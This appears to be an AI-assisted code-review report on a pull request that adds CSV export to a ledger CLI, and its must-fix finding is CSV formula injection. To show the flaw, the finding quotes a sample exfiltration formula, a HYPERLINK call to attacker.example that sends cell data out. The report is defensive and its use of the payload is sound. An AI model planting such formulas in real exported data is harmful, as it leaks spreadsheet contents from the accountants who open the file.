# review-code — one-shot / publishable — https://github.com/example/ledger/pull/4

Skill root: `/tmp/rcs-savings/skills/d8c2dd9/skills/review-code`
Repository (local checkout): `/tmp/rcs-savings/baseline/publishable/repo`
Private work directory: `/tmp/rcs-savings/baseline/publishable/work/private`

This run used the supplied phase-1 packet (`forge_packet.py normalize` over the saved root
page) instead of a live forge fetch. No network access, no live forge commands, no
publication, and no mutation of reviewed source occurred at any point.

## Run identity

- Target: pull request `example/ledger#4`, **OPEN**, **not merged**
- head: `0eb283dfe715341548387bf65af857affedf5dfa`
- base_ref: `main` — base_sha / merge_base: `2301c83ee0b2ba0248fe3d2d1f6cd481963545ab`
- workflow: `v5b-24`
- context digest: `45a2fe742898267c6a52acfad4ff52cb5b988f8eb671321fe4749f479997822f`
- profile: `publishable` · mode: `one-shot`
- reviewer identity: `reviewer` · packet holds no prior review state → **first review**, not a re-review
- coverage: **complete**

## Status: Changes Requested

**1 must-fix finding** (security, P2). No open material questions. 1 observation. 0 disputed/prior items (first review).

## Summary (as composed)

**Intent:** Add a `--format csv` option to `ledger statement` that reuses `statement_rows` to export an account's statement as CSV, alongside the existing plain-text default (closes issue #3).

**Issue fit:** Met — the CLI wires `--format {csv,text}` with `text` as the default, the CSV header and decimal formatting match the text statement exactly, and comma/quote/newline descriptions round-trip through `csv.reader`. The confirmed finding below is a security defect in the new export path itself, not a failure of any stated acceptance criterion.

**Coverage:** Complete merge-base diff reviewed: `ledger/cli.py` (changed), new `ledger/export.py`, new `tests/test_export.py`. Callees `ledger/accounts.py` and `ledger/statement.py` inspected for the reused formatting and data path. Full suite run once at the pinned head (`python3 -m unittest discover -s tests -v`): 16 passed, 0 failed. One mandatory security verification batch dispatched to a fresh-context worker and confirmed; allowance: initial batch spent, follow-up unused.

## Findings

### [P2] [must-fix] Neutralize formula-trigger characters before writing CSV cells
id: `export/csv-formula-injection` · kind: security · anchor: `ledger/export.py:18` (RIGHT) · fix: `ledger/export.py:13-19`

**Triggers when:** An entry is posted with a description beginning with a formula-trigger character, for example `=HYPERLINK("http://attacker.example/?"&A1,"x")`, via `Ledger.post` (`ledger/accounts.py`), which accepts `description` as an arbitrary string with no character restriction. The account's statement is then exported with `ledger statement FILE ACCOUNT --format csv`, and the resulting file is opened in a spreadsheet application — the consumer the pull request itself names ("accountants want to open them in a spreadsheet").

**Impact:** The spreadsheet application evaluates the injected formula on open, which can exfiltrate other cell data to an attacker-controlled URL through a `HYPERLINK`/`IMPORTXML`-style payload or, on configurations where legacy dynamic-data-exchange formulas are still honored, run an external command — directly targeting the accountants this feature is built for. This defect is entirely new: at the merge-base, no CSV export path existed at all.

**Change:** In `ledger/export.py`'s `statement_csv`, before writing each row, prefix any field whose text begins with `=`, `+`, `-`, `@`, a tab, or a carriage return with a leading single quote (the standard CSV/formula-injection neutralization), so spreadsheet applications render the cell as text instead of evaluating it.

**Source:** pr-body ("accountants want to open them in a spreadsheet"); independently confirmed by a fresh-context verifier, which reproduced the unmodified formula in `statement_csv`'s output.

## Questions

None.

## Observations (1 of max 3)

- `tests/test_cli.py` has no case invoking `--format csv`; the flag's wiring from `ledger/cli.py`'s `FORMATS` dict to `statement_csv` is exercised only by this review's manual CLI run, not by an added or existing automated test. Evidence: `tests/test_cli.py` (no `--format` case); `ledger/cli.py:13,35,44`.

## Requirement outcomes (issue #3, `example/ledger#3`)

| # | Acceptance criterion | Class | Disposition | Evidence |
|---|---|---|---|---|
| 1 | `ledger statement FILE ACCOUNT --format csv` prints CSV; text stays default | acceptance | **met** | `ledger/cli.py:13` `FORMATS={"text":render_statement,"csv":statement_csv}`; `:35` `--format`, `default="text"`; `:44` dispatch. Manual CLI run confirmed both paths. |
| 2 | First row is header `date,description,amount,balance` | acceptance | **met** | `ledger/export.py:10` `HEADER` tuple; `tests/test_export.py:19`. |
| 3 | Amounts/balances use text statement's decimal format (e.g. `-4.50`) | acceptance | **met** | `statement_csv` reuses `ledger/statement.py:14-21` `statement_rows` → `format_cents`; `tests/test_export.py:20,24`. |
| 4 | Descriptions with commas/quotes/newlines round-trip through `csv.reader` | acceptance | **met** | `csv.writer` QUOTE_MINIMAL; `tests/test_export.py:22-24` (comma+quotes); this review additionally reproduced an embedded-newline description round-tripping correctly (not covered by an added test — see Observations). |

## Per-file coverage (complete pinned merge-base diff)

| File | State | Notes |
|---|---|---|
| `ledger/cli.py` | reviewed | `+6 -2`; wires `--format` to `FORMATS` dict |
| `ledger/export.py` | reviewed | new file, `+19`; contains the confirmed finding |
| `tests/test_export.py` | reviewed | new file, `+28`; inspected per `changed-tests.md` — both tests assert real behavior of `statement_csv`, no defeated setup/cleanup, executed and passing |

3/3 changed files reviewed; 0 ignored; 0 unreviewed.

## Check evidence

| Check | Head | Outcome | Reason |
|---|---|---|---|
| `python3 -m unittest discover -s tests -v` | `0eb283dfe715341548387bf65af857affedf5dfa` | reviewer-executed | Full suite, clean tree, pinned head; 16/16 passed (exit 0), including both new `ExportTest` cases. Wrapped via `run_events.py` (`run-events.jsonl`). |

No caller-supplied check evidence was provided; none reused.

## Verification

**Mandatory** (finding is `must-fix` + `security`). One candidate dispatched in the initial batch to a fresh-context worker (Agent, `subagent_type: general-purpose`, `model: sonnet`, high effort, `run_in_background: false`, awaited synchronously — no prior conversation, brief+manifest only).

- Task `export/csv-formula-injection` (candidate, trigger `security`, batch `initial`) → **confirmed**. The worker independently traced `Ledger.post` → `Entry.description` → `statement_rows` → `statement_csv` → `csv.writer`, reproduced the unmodified formula in the CSV output with a local disposable repro, and ran a `safety_rulings` check on "does `csv.writer` neutralize formula-trigger leads" → `fails`.
- Accounting: `python3 scripts/account_verifier_return.py` exit 0, `structurally_complete: true`, candidate accounted (not withheld), manifest SHA-256 matched exactly.
- Safety-premise check: not triggered — the review does not conclude with "no blocker" (a confirmed must-fix exists), so the premise-check precondition in `review-rubric.md`/SKILL.md never applies this run.
- Batch allowance: **initial batch spent**, follow-up **unused**. No pending or withheld tasks; `outstanding: []`.

## Ambiguities / disputed / unrecoverable inputs

None. Packet was `complete`; `merged: false` was explicit in the supplied packet (no unrecoverable-input gap). Not a re-review (no prior reviewer-identity state in the packet), so `re-review.md`'s duplicate-review shortcut and prior-item classification do not apply.

## Artifacts (all local; nothing published or posted)

| Artifact | Path |
|---|---|
| Review context store | `/tmp/rcs-savings/baseline/publishable/work/private/review-context-0eb283d.json` |
| Context print (manifest/diff/ranges/chunks) | `/tmp/rcs-savings/baseline/publishable/work/private/context-print.md` |
| Composition input | `/tmp/rcs-savings/baseline/publishable/work/private/composition.json` |
| **Validator payload (publishable)** | `/tmp/rcs-savings/baseline/publishable/work/private/payload.json` |
| Forge batch projection (not posted) | `/tmp/rcs-savings/baseline/publishable/work/private/batch.json` |
| Rendered fragments | `/tmp/rcs-savings/baseline/publishable/work/private/fragments.md` |
| Verifier input (pre-build) | `/tmp/rcs-savings/baseline/publishable/work/private/verifier-input-initial.json` |
| Verifier bundle (brief + manifest + projected input) | `/tmp/rcs-savings/baseline/publishable/work/private/verify-initial/{brief.md,manifest.json,input.json}` |
| Verifier raw return (verbatim) | `/tmp/rcs-savings/baseline/publishable/work/private/verify-initial/raw-return.json` |
| Verifier accounting report | `/tmp/rcs-savings/baseline/publishable/work/private/verify-initial/accounting.json` |
| Run timing events | `/tmp/rcs-savings/baseline/publishable/work/private/run-events.jsonl` |
| This report | `/tmp/rcs-savings/baseline/publishable/work/report.md` |

## Batch allowance ledger

One initial batch used (1 candidate, `export/csv-formula-injection` → confirmed). No follow-up batch was needed or used. This satisfies the "one initial batch and at most one follow-up" allowance for this review and all its continuations.

## Coverage completeness statement

Coverage is **complete**: every changed file reviewed, the affected-behavior callees (`ledger/accounts.py`, `ledger/statement.py`) inspected, the added tests inspected under `changed-tests.md` and executed once, all four acceptance criteria settled with evidence, and the one required (mandatory) verification batch dispatched, awaited, and accounted with a `confirmed` ruling — nothing was left pending, withheld, or unresolved. No input could not be finished.
